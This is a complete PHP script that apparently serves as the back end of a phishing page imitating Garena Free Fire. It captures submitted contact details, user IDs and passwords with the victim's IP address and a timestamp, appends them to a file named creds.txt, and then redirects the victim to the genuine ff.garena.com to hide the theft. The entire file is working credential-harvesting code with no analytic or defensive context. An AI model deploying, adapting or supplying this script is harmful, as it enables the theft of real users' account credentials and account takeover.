<?php
date_default_timezone_set("Asia/Kolkata"); // optional: for local time logging

$logFile = "creds.txt";

$contact = $_POST['contact'] ?? 'N/A';
$uid = $_POST['uid'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("Y-m-d H:i:s");

$data = "[{$time}] IP: {$ip} | Contact: {$contact} | UID: {$uid} | Pass: {$password}\n";

file_put_contents($logFile, $data, FILE_APPEND);

header("Location: https://ff.garena.com");
exit();
?>
